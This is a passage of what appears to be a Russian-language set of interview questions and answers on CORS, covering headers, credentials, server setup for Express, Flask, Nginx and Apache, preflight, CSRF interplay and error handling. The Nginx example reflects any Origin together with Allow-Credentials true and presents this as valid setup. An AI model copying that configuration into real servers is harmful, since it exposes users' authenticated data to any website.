Access-Control-Allow-Credentials: true</li><li>Требует конкретный origin (не *)</li><li>На клиенте нужно credentials: 'include' в fetch</li></ul><p><strong>5. Access-Control-Max-Age:</strong></p><ul><li>Время кэширования preflight ответа в секундах</li><li>Только в preflight ответе</li><li>Пример: Access-Control-Max-Age: 86400 (24 часа)</li><li>Уменьшает количество OPTIONS запросов</li><li>Браузеры ограничивают максимум (обычно 24 часа)</li></ul><p><strong>6. Access-Control-Expose-Headers:</strong></p><ul><li>Какие заголовки ответа доступны JavaScript</li><li>По умолчанию доступны только простые: Cache-Control, Content-Language, Content-Type, Expires, Last-Modified, Pragma</li><li>Пример: Access-Control-Expose-Headers: X-Custom-Header, X-Another</li><li>Позволяет читать кастомные заголовки из ответа</li></ul><p><strong>Примеры конфигураций:</strong></p><p><strong>Минимальная (только чтение):</strong></p><ul><li>Access-Control-Allow-Origin: https://app.example.com</li></ul><p><strong>С credentials (cookies):</strong></p><ul><li>Access-Control-Allow-Origin: https://app.example.com</li><li>Access-Control-Allow-Credentials: true</li></ul><p><strong>Полная preflight конфигурация:</strong></p><ul><li>Access-Control-Allow-Origin: https://app.example.com</li><li>Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS</li><li>Access-Control-Allow-Headers: Authorization, Content-Type, X-Custom</li><li>Access-Control-Allow-Credentials: true</li><li>Access-Control-Max-Age: 86400</li><li>Access-Control-Expose-Headers: X-Total-Count, X-Page</li></ul><p><strong>Публичное API (без credentials):</strong></p><ul><li>Access-Control-Allow-Origin: *</li><li>Access-Control-Allow-Methods: GET, POST</li></ul>",
    difficulty: 'middle',
    tags: ['CORS', 'заголовки', 'Access-Control', 'конфигурация']
  },
  {
    id: 35,
    question: "Как работают CORS запросы с credentials (cookies, Authorization)?",
    answer: "<p><strong>CORS с credentials</strong> позволяет отправлять cookies, HTTP authentication и TLS сертификаты в cross-origin запросах.</p><p><strong>По умолчанию:</strong></p><ul><li>Cross-origin запросы НЕ включают credentials</li><li>Cookies не отправляются автоматически</li><li>Authorization заголовок не добавляется</li><li>Это сделано для безопасности</li></ul><p><strong>Чтобы включить credentials:</strong></p><p><strong>На клиенте (JavaScript):</strong></p><ul><li>fetch: credentials: 'include'</li><li>XMLHttpRequest: withCredentials = true</li></ul><p><strong>На сервере:</strong></p><ul><li>Access-Control-Allow-Credentials: true</li><li>Access-Control-Allow-Origin должен быть конкретный origin (НЕ *)</li></ul><p><strong>Все три режима credentials в fetch:</strong></p><p><strong>1. credentials: 'omit':</strong></p><ul><li>Никогда не отправлять credentials</li><li>Даже для same-origin запросов</li></ul><p><strong>2. credentials: 'same-origin' (по умолчанию):</strong></p><ul><li>Отправлять только для same-origin запросов</li><li>Cross-origin — без credentials</li></ul><p><strong>3. credentials: 'include':</strong></p><ul><li>Всегда отправлять credentials</li><li>Для same-origin и cross-origin</li><li>Требует серверной поддержки для cross-origin</li></ul><p><strong>Что включают credentials:</strong></p><ul><li>HTTP cookies (все cookies для домена)</li><li>HTTP authentication (Basic, Bearer токены в Authorization)</li><li>TLS client certificates</li></ul><p><strong>Строгие требования для credentials:</strong></p><p><strong>1. Нельзя использовать Access-Control-Allow-Origin: *</strong></p><ul><li>Должен быть точный origin</li><li>Access-Control-Allow-Origin: https://app.example.com</li><li>Это предотвращает утечку credentials на любые сайты</li></ul><p><strong>2. Нужен Access-Control-Allow-Credentials: true</strong></p><ul><li>Явное разрешение на сервере</li><li>Без этого заголовка credentials игнорируются</li></ul><p><strong>3. Если есть preflight:</strong></p><ul><li>Заголовки должны быть и в OPTIONS, и в основном ответе</li><li>Access-Control-Allow-Credentials в обоих ответах</li></ul><p><strong>Важные нюансы cookies с credentials:</strong></p><p><strong>SameSite влияет на CORS:</strong></p><ul><li>SameSite=Strict — cookies НЕ отправятся в cross-origin</li><li>SameSite=Lax — cookies НЕ отправятся в cross-origin POST</li><li>SameSite=None — cookies отправятся (требует Secure)</li></ul><p>Для CORS с cookies нужно:</p><ul><li>Cookie должна иметь SameSite=None; Secure</li><li>Иначе браузер не отправит её в cross-origin запросе</li></ul><p><strong>Безопасность credentials:</strong></p><p><strong>Риски:</strong></p><ul><li>Утечка session cookies на злонамеренные сайты</li><li>CSRF атаки через credentials</li><li>Нужна особая осторожность</li></ul><p><strong>Best practices:</strong></p><ul><li>Не используйте * для API с credentials</li><li>Валидируйте Origin на сервере дополнительно</li><li>Используйте CSRF токены для защиты</li><li>Ограничьте список разрешенных origins</li><li>Регулярный аудит CORS конфигурации</li></ul><p><strong>Динамический Origin (правильный подход):</strong></p><ul><li>Не хардкодить origins в коде</li><li>Проверять Origin из запроса против whitelist</li><li>Возвращать тот Origin, который пришел (если разрешен)</li><li>Это позволяет поддерживать несколько origins</li></ul><p><strong>Альтернативы credentials для аутентификации:</strong></p><ul><li>JWT токены в Authorization header (не требуют credentials: 'include')</li><li>API ключи в кастомных заголовках</li><li>OAuth токены</li><li>Эти методы безопаснее для публичных API</li></ul>",
    difficulty: 'middle',
    tags: ['CORS', 'credentials', 'cookies', 'аутентификация', 'безопасность']
  },
  {
    id: 36,
    question: "Как правильно настроить CORS на сервере? Покажи примеры для разных платформ.",
    answer: "<p><strong>Настройка CORS на сервере</strong> зависит от используемой технологии, но принципы одинаковы.</p><p><strong>Node.js + Express:</strong></p><p><strong>Вариант 1 - Вручную:</strong></p><pre><code>app.use((req, res, next) => {\n  // Разрешенные origins\n  const allowedOrigins = [\n    'https://app.example.com',\n    'https://admin.example.com'\n  ];\n  \n  const origin = req.headers.origin;\n  \n  if (allowedOrigins.includes(origin)) {\n    res.setHeader('Access-Control-Allow-Origin', origin);\n  }\n  \n  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');\n  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');\n  res.setHeader('Access-Control-Allow-Credentials', 'true');\n  res.setHeader('Access-Control-Max-Age', '86400');\n  \n  // Preflight\n  if (req.method === 'OPTIONS') {\n    return res.sendStatus(204);\n  }\n  \n  next();\n});</code></pre><p><strong>Вариант 2 - Пакет cors:</strong></p><pre><code>const cors = require('cors');\n\n// Простая конфигурация (все origins)\napp.use(cors());\n\n// Детальная конфигурация\nconst corsOptions = {\n  origin: function (origin, callback) {\n    const whitelist = ['https://app.example.com', 'https://admin.example.com'];\n    if (whitelist.indexOf(origin) !== -1 || !origin) {\n      callback(null, true);\n    } else {\n      callback(new Error('Not allowed by CORS'));\n    }\n  },\n  credentials: true,\n  methods: ['GET', 'POST', 'PUT', 'DELETE'],\n  allowedHeaders: ['Content-Type', 'Authorization'],\n  exposedHeaders: ['X-Total-Count'],\n  maxAge: 86400\n};\n\napp.use(cors(corsOptions));\n\n// Или для конкретных роутов\napp.get('/api/public', cors(), (req, res) => {\n  res.json({ message: 'Public data' });\n});</code></pre><p><strong>Python + Flask:</strong></p><pre><code>from flask import Flask, request\nfrom flask_cors import CORS\n\napp = Flask(__name__)\n\n# Простая конфигурация\nCORS(app)\n\n# Детальная конфигурация\nCORS(app, \n     origins=['https://app.example.com', 'https://admin.example.com'],\n     methods=['GET', 'POST', 'PUT', 'DELETE'],\n     allow_headers=['Content-Type', 'Authorization'],\n     supports_credentials=True,\n     max_age=86400\n)\n\n# Или вручную\n@app.after_request\ndef after_request(response):\n    allowed_origins = ['https://app.example.com']\n    origin = request.headers.get('Origin')\n    \n    if origin in allowed_origins:\n        response.headers['Access-Control-Allow-Origin'] = origin\n        response.headers['Access-Control-Allow-Credentials'] = 'true'\n        response.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE'\n        response.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization'\n    \n    return response</code></pre><p><strong>Nginx (reverse proxy):</strong></p><pre><code>server {\n    listen 443 ssl;\n    server_name api.example.com;\n    \n    location /api {\n        # Обработка preflight\n        if ($request_method = 'OPTIONS') {\n            add_header 'Access-Control-Allow-Origin' '$http_origin' always;\n            add_header 'Access-Control-Allow-Methods' 'GET, POST, PUT, DELETE, OPTIONS' always;\n            add_header 'Access-Control-Allow-Headers' 'Content-Type, Authorization' always;\n            add_header 'Access-Control-Allow-Credentials' 'true' always;\n            add_header 'Access-Control-Max-Age' 86400 always;\n            return 204;\n        }\n        \n        # Основные запросы\n        add_header 'Access-Control-Allow-Origin' '$http_origin' always;\n        add_header 'Access-Control-Allow-Credentials' 'true' always;\n        \n        proxy_pass http://backend:3000;\n    }\n}</code></pre><p><strong>Apache (.htaccess):</strong></p><pre><code># Установка CORS заголовков\nHeader always set Access-Control-Allow-Origin \"https://app.example.com\"\nHeader always set Access-Control-Allow-Methods \"GET, POST, PUT, DELETE, OPTIONS\"\nHeader always set Access-Control-Allow-Headers \"Content-Type, Authorization\"\nHeader always set Access-Control-Allow-Credentials \"true\"\n\n# Preflight запросы\nRewriteEngine On\nRewriteCond %{REQUEST_METHOD} OPTIONS\nRewriteRule ^(.*)$ $1 [R=204,L]</code></pre><p><strong>Best practices конфигурации:</strong></p><ul><li>✅ Используйте whitelist разрешенных origins</li><li>✅ Не используйте * для production API</li><li>✅ Валидируйте Origin на сервере</li><li>✅ Возвращайте конкретный Origin из запроса (если разрешен)</li><li>✅ Устанавливайте Access-Control-Max-Age для кэширования</li><li>✅ Обрабатывайте OPTIONS правильно (204 status)</li><li>✅ Используйте HTTPS для credentials</li><li>❌ Не доверяйте только CORS для безопасности</li><li>❌ Не открывайте все origins без необходимости</li></ul>",
    difficulty: 'middle',
    tags: ['CORS', 'настройка', 'сервер', 'конфигурация', 'Express']
  },
  {
    id: 37,
    question: "Какие ошибки CORS наиболее распространены и как их диагностировать?",
    answer: "<p><strong>Типичные CORS ошибки</strong> и методы их диагностики.</p><p><strong>1. \"No 'Access-Control-Allow-Origin' header\"</strong></p><p><strong>Ошибка:</strong></p><ul><li>Access to fetch at 'https://api.com' from origin 'https://app.com' has been blocked by CORS policy: No 'Access-Control-Allow-Origin' header is present on the requested resource.</li></ul><p><strong>Причины:</strong></p><ul><li>Сервер не настроен для CORS</li><li>Сервер не возвращает Access-Control-Allow-Origin</li><li>Origin не в whitelist</li></ul><p><strong>Решение:</strong></p><ul><li>Добавить CORS заголовки на сервере</li><li>Проверить что Origin включен в разрешенные</li><li>Убедиться что заголовки возвращаются для всех ответов (включая ошибки)</li></ul><p><strong>2. \"Origin not allowed\"</strong></p><p><strong>Ошибка:</strong></p><ul><li>The 'Access-Control-Allow-Origin' header has a value 'https://other.com' that is not equal to the supplied origin.</li></ul><p><strong>Причины:</strong></p><ul><li>Возвращен неправильный Origin</li><li>Origin хардкоден и не совпадает с текущим</li><li>Опечатка в домене</li></ul><p><strong>Решение:</strong></p><ul><li>Проверить что Origin совпадает точно (включая протокол и порт)</li><li>Использовать динамическую проверку Origin</li><li>Добавить нужный Origin в whitelist</li></ul><p><strong>3. \"Credentials flag is true but Allow-Origin is *\"</strong></p><p><strong>Ошибка:</strong></p><ul><li>The value of the 'Access-Control-Allow-Origin' header must not be the wildcard '*' when the request's credentials mode is 'include'.</li></ul><p><strong>Причины:</strong></p><ul><li>Используется credentials: 'include'</li><li>Но сервер вернул Access-Control-Allow-Origin: *</li><li>Это запрещено спецификацией</li></ul><p><strong>Решение:</strong></p><ul><li>Изменить * на конкретный Origin</li><li>Или убрать credentials: 'include' на клиенте</li><li>Или убрать Access-Control-Allow-Credentials: true на сервере</li></ul><p><strong>4. \"Method not allowed in preflight\"</strong></p><p><strong>Ошибка:</strong></p><ul><li>Method DELETE is not allowed by Access-Control-Allow-Methods in preflight response.</li></ul><p><strong>Причины:</strong></p><ul><li>Сервер не разрешил метод DELETE</li><li>Access-Control-Allow-Methods не включает нужный метод</li></ul><p><strong>Решение:</strong></p><ul><li>Добавить метод в Access-Control-Allow-Methods</li><li>Убедиться что OPTIONS обрабатывается правильно</li></ul><p><strong>5. \"Header not allowed in preflight\"</strong></p><p><strong>Ошибка:</strong></p><ul><li>Request header field Authorization is not allowed by Access-Control-Allow-Headers in preflight response.</li></ul><p><strong>Причины:</strong></p><ul><li>Клиент отправляет заголовок Authorization</li><li>Сервер не разрешил этот заголовок</li></ul><p><strong>Решение:</strong></p><ul><li>Добавить заголовок в Access-Control-Allow-Headers</li><li>Проверить регистр (обычно case-insensitive, но лучше совпадение)</li></ul><p><strong>6. \"Redirect blocked by CORS\"</strong></p><p><strong>Проблема:</strong></p><ul><li>CORS запрос привел к redirect (301, 302, 307, 308)</li><li>Браузер не следует redirect для cross-origin</li></ul><p><strong>Решение:</strong></p><ul><li>Избегать redirects в CORS запросах</li><li>Возвращать финальный URL сразу</li><li>Или делать redirect на клиенте после получения Location</li></ul><p><strong>Диагностика CORS проблем:</strong></p><p><strong>1. DevTools Network tab:</strong></p><ul><li>Открыть запрос, посмотреть Headers</li><li>Request Headers → проверить Origin</li><li>Response Headers → проверить Access-Control-*</li><li>Для preflight проверить OPTIONS запрос</li></ul><p><strong>2. Проверить preflight отдельно:</strong></p><ul><li>Найти OPTIONS запрос перед основным</li><li>Проверить статус (должен быть 200 или 204)</li><li>Проверить все Access-Control-Allow-* заголовки</li></ul><p><strong>3. Проверить консоль браузера:</strong></p><ul><li>Четкое описание CORS ошибки</li><li>Указывает какой заголовок отсутствует</li></ul><p><strong>4. Тестирование через curl:</strong></p><ul><li>Проверить что сервер возвращает заголовки</li><li>OPTIONS запрос для preflight</li><li>Основной запрос с Origin</li></ul><p><strong>Советы по отладке:</strong></p><ul><li>✅ Проверяйте протокол (http vs https)</li><li>✅ Проверяйте порт (явный vs неявный)</li><li>✅ Проверяйте поддомены (www vs без www)</li><li>✅ Убедитесь что CORS работает для ошибок 4xx/5xx тоже</li><li>✅ Проверьте что middleware CORS стоит ДО роутов</li><li>✅ Тестируйте в разных браузерах</li></ul>",
    difficulty: 'middle',
    tags: ['CORS', 'ошибки', 'отладка', 'troubleshooting']
  },
  {
    id: 38,
    question: "Что такое CORS preflight request и когда он отправляется?",
    answer: "<p><strong>CORS preflight request</strong> — это автоматический OPTIONS запрос, который браузер отправляет перед основным запросом для проверки разрешений сервера.</p><p><strong>Зачем нужен preflight:</strong></p><ul><li>Защита серверов, не ожидающих определенные методы или заголовки</li><li>Проверка разрешений ДО отправки потенциально опасного запроса</li><li>Предотвращение нежелательных побочных эффектов</li><li>Серверу дается шанс отклонить запрос заранее</li></ul><p><strong>Когда отправляется preflight:</strong></p><p><strong>1. Используются методы кроме:</strong></p><ul><li>GET, HEAD, POST</li><li>Любой другой метод → preflight</li><li>Примеры: PUT, DELETE, PATCH, CONNECT</li></ul><p><strong>2. Content-Type не является:</strong></p><ul><li>application/x-www-form-urlencoded</li><li>multipart/form-data</li><li>text/plain</li><li>Любой другой → preflight</li><li>application/json → требует preflight</li><li>application/xml → требует preflight</li></ul><p><strong>3. Используются кастомные заголовки:</strong></p><ul><li>Любой заголовок кроме стандартных CORS-safe</li><li>Authorization → требует preflight</li><li>X-Custom-Header → требует preflight</li><li>Content-Type с нестандартным значением → preflight</li></ul><p><strong>4. Особые условия:</strong></p><ul><li>XMLHttpRequest.upload имеет event listeners</li><li>ReadableStream используется в запросе</li></ul><p><strong>Структура preflight запроса:</strong></p><p><strong>Браузер отправляет OPTIONS:</strong></p><ul><li>Method: OPTIONS</li><li>Origin: https://app.example.com</li><li>Access-Control-Request-Method: DELETE</li><li>Access-Control-Request-Headers: Authorization, Content-Type</li></ul><p><strong>Сервер отвечает с разрешениями:</strong></p><ul><li>Status: 200 или 204</li><li>Access-Control-Allow-Origin: https://app.example.com</li><li>Access-Control-Allow-Methods: GET, POST, PUT, DELETE</li><li>Access-Control-Allow-Headers: Authorization, Content-Type</li><li>Access-Control-Max-Age: 86400</li></ul><p><strong>Если preflight успешен:</strong></p><ul><li>Браузер отправляет основной запрос</li><li>Сервер обрабатывает и возвращает данные</li><li>Браузер проверяет CORS заголовки в основном ответе тоже</li></ul><p><strong>Если preflight провален:</strong></p><ul><li>Основной запрос НЕ отправляется</li><li>JavaScript получает CORS error</li><li>В консоли подробное описание проблемы</li></ul><p><strong>Кэширование preflight:</strong></p><ul><li>Access-Control-Max-Age указывает время кэша (секунды)</li><li>Браузер не повторяет OPTIONS для идентичных запросов</li><li>Кэш применяется для одного origin + URL + метод + заголовки</li><li>Браузеры ограничивают максимум (обычно 86400 = 24 часа)</li></ul><p><strong>Оптимизация preflight запросов:</strong></p><ul><li>Устанавливайте Max-Age побольше (86400)</li><li>По возможности используйте simple requests</li><li>Группируйте запросы для уменьшения preflight</li><li>Content-Type: text/plain вместо application/json для простых данных</li></ul><p><strong>Важные нюансы:</strong></p><ul><li>Preflight не несет тело запроса (body)</li><li>Preflight не содержит credentials даже если основной запрос будет</li><li>Каждая уникальная комбинация метод+заголовки = новый preflight (если не в кэше)</li><li>Изменение хотя бы одного заголовка = новый preflight</li></ul>",
    difficulty: 'middle',
    tags: ['CORS', 'preflight', 'OPTIONS', 'механизм']
  },
  {
    id: 39,
    question: "Как избежать preflight запросов для оптимизации производительности?",
    answer: "<p><strong>Preflight запросы</strong> добавляют дополнительный round-trip, что увеличивает латентность. Существует несколько способов их избежать или минимизировать.</p><p><strong>Способы избежать preflight:</strong></p><p><strong>1. Использовать простые запросы (Simple Requests):</strong></p><p><strong>Методы только GET, HEAD, POST:</strong></p><ul><li>❌ Избегать: PUT, DELETE, PATCH</li><li>✅ Использовать: POST для всех операций</li><li>Можно эмулировать другие методы через POST с параметром</li></ul><p><strong>Content-Type ограничен:</strong></p><ul><li>❌ Избегать: application/json</li><li>✅ Использовать: text/plain или application/x-www-form-urlencoded</li><li>Для text/plain можно отправить JSON как строку</li></ul><p><strong>Только стандартные заголовки:</strong></p><ul><li>❌ Избегать: Authorization, X-Custom-Header</li><li>✅ Альтернатива: передавать токен в URL параметре или теле</li></ul><p><strong>Пример оптимизированного запроса:</strong></p><ul><li>Method: POST (вместо DELETE)</li><li>Content-Type: text/plain</li><li>Body: JSON.stringify({action: 'delete', id: 123})</li><li>Без кастомных заголовков</li><li>Это будет simple request без preflight</li></ul><p><strong>2. Кэширование preflight (Access-Control-Max-Age):</strong></p><ul><li>Установить на сервере максимальное время</li><li>Access-Control-Max-Age: 86400 (24 часа)</li><li>Браузер закэширует и не будет повторять OPTIONS</li><li>Работает для идентичных запросов к тому же URL</li></ul><p><strong>3. Использовать GET запросы где возможно:</strong></p><ul><li>GET всегда simple request (если без кастомных заголовков)</li><li>Для чтения данных предпочтительнее GET</li><li>Можно закодировать параметры в URL</li></ul><p><strong>4. Batch API запросы:</strong></p><ul><li>Объединить несколько операций в один запрос</li><li>Вместо 10 DELETE запросов → 1 POST с массивом ID</li><li>Один preflight вместо десяти</li></ul><p><strong>5. Server-sent events (SSE) для получения данных:</strong></p><ul><li>Одно соединение для потока данных</li><li>Не требует повторных запросов</li><li>Нет preflight для каждого обновления</li></ul><p><strong>6. WebSocket для real-time коммуникации:</strong></p><ul><li>Только один handshake запрос</li><li>Затем bidirectional коммуникация без новых HTTP запросов</li><li>Нет preflight для сообщений</li></ul><p><strong>Компромиссные решения:</strong></p><p><strong>Использовать POST для всех операций:</strong></p><ul><li>POST /api/users (создание)</li><li>POST /api/users/123/update (обновление)</li><li>POST /api/users/123/delete (удаление)</li><li>Все через POST с text/plain → без preflight</li></ul><p><strong>Токены в query параметрах (для публичных API):</strong></p><ul><li>GET /api/data?token=xyz вместо Authorization заголовка</li><li>Избегает preflight</li><li>НО менее безопасно (токен в URL, логи)</li><li>Только для некритичных данных</li></ul><p><strong>Что НЕ работает:</strong></p><ul><li>❌ Нельзя отключить preflight на клиенте</li><li>❌ Нельзя изменить поведение браузера</li><li>❌ Сервер не может запретить preflight</li><li>❌ CORS заголовки в запросе игнорируются</li></ul><p><strong>Best practices баланса:</strong></p><ul><li>✅ Для критичных операций (DELETE, PUT) — используйте правильные методы с preflight</li><li>✅ Для частых некритичных запросов — оптимизируйте под simple requests</li><li>✅ Устанавливайте Max-Age для кэширования</li><li>✅ Группируйте операции где возможно</li><li>✅ Используйте CDN с правильной CORS конфигурацией</li></ul>",
    difficulty: 'senior',
    tags: ['CORS', 'оптимизация', 'preflight', 'производительность']
  },
  {
    id: 40,
    question: "Как CORS взаимодействует с другими механизмами безопасности (CSP, CSRF)?",
    answer: "<p><strong>CORS работает в связке с другими механизмами безопасности</strong> и важно понимать их взаимодействие.</p><p><strong>CORS и CSP (Content Security Policy):</strong></p><p><strong>CSP контролирует откуда загружаются ресурсы:</strong></p><ul><li>CSP: какие домены могут загрузить скрипты, стили, изображения</li><li>CORS: какие домены могут делать AJAX запросы к вашему API</li><li>Это разные уровни контроля</li></ul><p><strong>CSP директивы не влияют на CORS:</strong></p><ul><li>connect-src ограничивает куда можно делать fetch/XHR</li><li>НО если запрос разрешен CSP, все равно нужен CORS на сервере</li><li>Двойная проверка для безопасности</li></ul><p><strong>Пример конфликта:</strong></p><ul><li>CSP: connect-src 'self' https://api.trusted.com</li><li>fetch('https://api.trusted.com/data') — CSP разрешает</li><li>НО если api.trusted.com не вернет CORS заголовки → blocked</li><li>Нужны оба: CSP разрешение И CORS заголовки</li></ul><p><strong>CORS и CSRF (Cross-Site Request Forgery):</strong></p><p><strong>Важно: CORS НЕ защищает от CSRF!</strong></p><p><strong>Почему CORS не защита от CSRF:</strong></p><ul><li>CORS работает только в браузере</li><li>Злонамеренный сервер может игнорировать CORS</li><li>Можно отправить запрос с сервера (без браузера)</li><li>CORS блокирует чтение ответа, но НЕ отправку запроса</li></ul><p><strong>Сценарий атаки:</strong></p><ol><li>Пользователь залогинен на bank.com</li><li>Переходит на evil.com</li><li>evil.com отправляет POST к bank.com/transfer</li><li>Браузер прикрепляет cookies автоматически</li><li>CORS блокирует чтение ответа для evil.com</li><li>НО запрос уже выполнен, деньги переведены!</li></ol><p><strong>Защита: комбинация CORS + CSRF токены + SameSite cookies:</strong></p><ul><li>CORS ограничивает чтение данных</li><li>CSRF токены защищают от подделки запросов</li><li>SameSite cookies не отправляются в cross-site запросах</li></ul><p><strong>CORS и SameSite cookies:</strong></p><p><strong>SameSite влияет на CORS запросы с credentials:</strong></p><ul><li>SameSite=Strict — cookies НЕ отправятся в CORS запросе</li><li>SameSite=Lax — cookies НЕ отправятся в CORS POST</li><li>SameSite=None — cookies отправятся (требует Secure)</li></ul><p><strong>Для CORS API с аутентификацией:</strong></p><ul><li>Cookie должна быть SameSite=None; Secure</li><li>Плюс Access-Control-Allow-Credentials: true</li><li>Плюс credentials: 'include' на клиенте</li></ul><p><strong>CORS и Mixed Content:</strong></p><ul><li>HTTPS страница не может делать запросы к HTTP API</li><li>Браузер блокирует до CORS проверки</li><li>Mixed content блокировка приоритетнее CORS</li></ul><p><strong>Комплексная защита API:</strong></p><p><strong>Уровень 1 - CORS:</strong></p><ul><li>Ограничивает какие origins могут читать данные</li><li>Whitelist разрешенных доменов</li><li>Правильная настройка credentials</li></ul><p><strong>Уровень 2 - Аутентификация:</strong></p><ul><li>JWT токены или session cookies</li><li>Проверка на каждый запрос</li><li>Expire и refresh токенов</li></ul><p><strong>Уровень 3 - CSRF защита:</strong></p><ul><li>CSRF токены для state-changing операций</li><li>SameSite cookies</li><li>Проверка Origin/Referer заголовков</li></ul><p><strong>Уровень 4 - Rate limiting:</strong></p><ul><li>Ограничение количества запросов</li><li>Защита от brute force</li><li>Throttling по IP или токену</li></ul><p><strong>Уровень 5 - Input validation:</strong></p><ul><li>Валидация всех входных данных</li><li>Sanitization для предотвращения XSS</li><li>SQL injection защита</li></ul><p><strong>Best practices безопасности:</strong></p><ul><li>✅ CORS для контроля чтения данных</li><li>✅ CSRF токены для изменяющих операций</li><li>✅ SameSite=Lax минимум для cookies</li><li>✅ HTTPS обязательно</li><li>✅ Аутентификация на каждый запрос</li><li>✅ Rate limiting</li><li>✅ Логирование подозрительной активности</li><li>❌ Не полагайтесь только на CORS для безопасности</li><li>❌ Не используйте CORS как замену аутентификации</li></ul>",
    difficulty: 'senior',
    tags: ['CORS', 'безопасность', 'CSP', 'CSRF', 'SameSite']
  },
  {
    id: 41,
    question: "Какие есть альтернативы CORS для cross-origin коммуникации?",
    answer: "<p><strong>Альтернативные методы cross-origin коммуникации</strong> когда CORS не подходит или ограничен.</p><p><strong>1. JSONP (JSON with Padding):</strong></p><p><strong>Как работает:</strong></p><ul><li>Использует &lt;script&gt; тег, который не ограничен Same-Origin Policy</li><li>Сервер возвращает JavaScript код с callback функцией</li><li>Клиент определяет callback и получает данные</li></ul><p><strong>Ограничения JSONP:</strong></p><ul><li>Только GET запросы</li><li>Нет контроля над ошибками</li><li>Потенциальные проблемы безопасности (XSS)</li><li>Устаревший метод, не рекомендуется</li></ul><p><strong>2. Server-side Proxy (прокси-сервер):</strong></p><p><strong>Как работает:</strong></p><ul><li>Ваш сервер делает запрос к стороннему API</li><li>Клиент делает запрос к вашему серверу (same-origin)</li><li>Сервер возвращает данные клиенту</li><li>Нет CORS проблем, так как сервер не ограничен браузером</li></ul><p><strong>Преимущества:</strong></p><ul><li>Полный контроль над запросами</li><li>Можно добавить кэширование</li><li>Скрыть API ключи от клиента</li><li>Трансформация данных на сервере</li></ul><p><strong>Недостатки:</strong></p><ul><li>Дополнительная нагрузка на сервер</li><li>Увеличенная латентность</li><li>Нужно поддерживать серверный код</li></ul><p><strong>3. postMessage API:</strong></p><p><strong>Для iframe коммуникации:</strong></p><ul><li>Безопасная передача данных между окнами/iframe разных origins</li><li>Явный контроль над сообщениями</li><li>Проверка origin отправителя</li></ul><p><strong>Использование:</strong></p><ul><li>Встраивание виджетов</li><li>OAuth flows</li><li>Платежные формы в iframe</li></ul><p><strong>4. WebSockets:</strong></p><p><strong>Как работает:</strong></p><ul><li>Устанавливается постоянное соединение</li><li>Bidirectional коммуникация</li><li>Не ограничено Same-Origin Policy (с правильным handshake)</li></ul><p><strong>Преимущества:</strong></p><ul><li>Real-time данные</li><li>Низкая латентность</li><li>Эффективнее для частых обновлений</li></ul><p><strong>CORS аспект WebSocket:</strong></p><ul><li>Нужна проверка Origin в handshake</li><li>Сервер должен валидировать подключения</li></ul><p><strong>5. Server-Sent Events (SSE):</strong></p><p><strong>Для односторонней передачи данных:</strong></p><ul><li>Сервер → клиент потоковая передача</li><li>Подчиняется CORS правилам</li><li>Нужны CORS заголовки на сервере</li></ul><p><strong>6. Browser Extensions/Add-ons:</strong></p><p><strong>Для разработки:</strong></p><ul><li>Расширения браузера могут обходить CORS</li><li>Полезно для тестирования</li><li>НЕ решение для production</li></ul><p><strong>7. Изменение архитектуры:</strong></p><p><strong>Варианты:</strong></p><ul><li>API и фронтенд на одном домене</li><li>Использование поддоменов вместо разных доменов</li><li>Reverse proxy для объединения доменов</li></ul><p><strong>Сравнение методов:</strong></p><table><tr><th>Метод</th><th>Сложность</th><th>Безопасность</th><th>Производительность</th></tr><tr><td>CORS</td><td>Низкая</td><td>Высокая</td><td>Отличная</td></tr><tr><td>JSONP</td><td>Низкая</td><td>Низкая</td><td>Средняя</td></tr><tr><td>Proxy</td><td>Средняя</td><td>Высокая</td><td>Средняя</td></tr><tr><td>postMessage</td><td>Средняя</td><td>Высокая</td><td>Хорошая</td></tr><tr><td>WebSocket</td><td>Высокая</td><td>Средняя</td><td>Отличная</td></tr></table><p><strong>Рекомендации по выбору:</strong></p><ul><li>✅ CORS — предпочтительный метод для большинства случаев</li><li>✅ Proxy — когда нужно скрыть API ключи или нет контроля над сторонним API</li><li>✅ postMessage — для iframe интеграций</li><li>✅ WebSocket — для real-time приложений</li><li>❌ JSONP — избегать, устарел и небезопасен</li></ul>",
    difficulty: 'middle',
    tags: ['CORS', 'альтернативы', 'JSONP', 'proxy', 'WebSocket']
  },
  {
    id: 42,
    question: "Как обрабатывать CORS ошибки на клиенте gracefully?",
    answer: "<p><strong>Graceful обработка CORS ошибок</strong> важна для хорошего пользовательского опыта.</p><p><strong>Особенность CORS ошибок:</strong></p><ul><li>Браузер блокирует доступ к деталям ответа</li><li>JavaScript не может прочитать статус код при CORS ошибке</li><li>Доступна только общая ошибка «CORS policy blocked»</li><li>Сложно различить типы CORS проблем на клиенте</li></ul><p><strong>Базовая обработка с fetch:</strong></p><pre><code>async function fetchWithCORS(url) {\n  try {\n    const response = await fetch(url, {\n      method: 'GET',\n      headers: {\n        'Content-Type': 'application/json'\n      }\n    });\n    \n    if (!response.ok) {\n      throw new Error(`HTTP error! status: ${response.status}`);\n    }\n    \n    return await response.json();\n    \n  } catch (error) {\n    // Проверка на CORS ошибку\n    if (error.message.includes('CORS') || \n        error.message.includes('NetworkError')) {\n      console.error('CORS error:', error);\n      // Показать пользователю понятное сообщение\n      showUserMessage('Невозможно загрузить данные из-за ограничений безопасности');\n      // Попробовать альтернативный метод\n      return fallbackMethod();\n    }\n    \n    throw error;\n  }\n}</code></pre><p><strong>Продвинутая обработка с retry и fallback:</strong></p><pre><code>class CORSHandler {\n  constructor(options = {}) {\n    this.maxRetries = options.maxRetries || 3;\n    this.retryDelay = options.retryDelay || 1000;\n    this.fallbackURL = options.fallbackURL;\n  }\n  \n  async fetchWithRetry(url, options = {}, retryCount = 0) {\n    try {\n      const response = await fetch(url, options);\n      \n      if (!response.ok) {\n        throw new Error(`HTTP ${response.status}`);\n      }\n      \n      return await response.json();\n      \n    } catch (error) {\n      // Определить тип ошибки\n      const isCORSError = this.isCORSError(error);\n      const isNetworkError = this.isNetworkError(error);\n      \n      if (isCORSError) {\n        console.warn('CORS error detected');\n        \n        // Попробовать fallback URL если есть\n        if (this.fallbackURL && retryCount === 0) {\n          console.log('Trying fallback URL...');\n          return this.fetchWithRetry(this.fallbackURL, options, retryCount + 1);\n        }\n        \n        // Показать пользователю\n        this.handleCORSError();\n        throw new Error('CORS_BLOCKED');\n      }\n      \n      if (isNetworkError && retryCount < 